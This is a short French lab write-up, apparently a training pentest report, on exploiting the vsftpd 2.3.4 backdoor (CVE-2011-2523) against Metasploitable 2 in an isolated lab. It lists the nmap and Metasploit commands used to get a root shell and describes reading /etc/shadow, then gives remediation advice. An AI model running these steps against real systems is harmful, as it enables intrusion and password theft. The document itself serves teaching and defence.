# Phase 2 - Exploitation : backdoor vsftpd 2.3.4

## Contexte
Cible : Metasploitable 2 (192.168.188.3), réseau isolé du lab.
Service visé : serveur FTP vsftpd, port 21.

## 1. Reconnaissance
Scan de services avec nmap :
    nmap -sV 192.168.188.3
Résultat clé : port 21 ouvert, `vsftpd 2.3.4` - version connue pour
contenir une backdoor (CVE-2011-2523).

## 2. Exploitation
Via Metasploit :
    use exploit/unix/ftp/vsftpd_234_backdoor
    set RHOSTS 192.168.188.3
    exploit

La backdoor s'active quand un nom d'utilisateur se termine par ":)".
Elle ouvre un shell caché sur le port 6200.

## 3. Impact
- Shell obtenu avec les droits **root** (uid=0) — contrôle total de la machine.
- Lecture de /etc/shadow (hashes de tous les comptes) → compromission
  totale possible (vol et crack des mots de passe).
(voir screenshots/phase2-vsftpd.png)

## 4. Remédiation
- Mettre à jour vsftpd vers une version saine (la 2.3.4 piégée doit être bannie).
- Vérifier l'intégrité des binaires téléchargés (signatures/hashes officiels).
- Segmenter le réseau et restreindre l'accès au port FTP (pare-feu).
- Préférer SFTP/FTPS au FTP en clair.

## Référence
CVE-2011-2523 - vsftpd 2.3.4 backdoor command execution.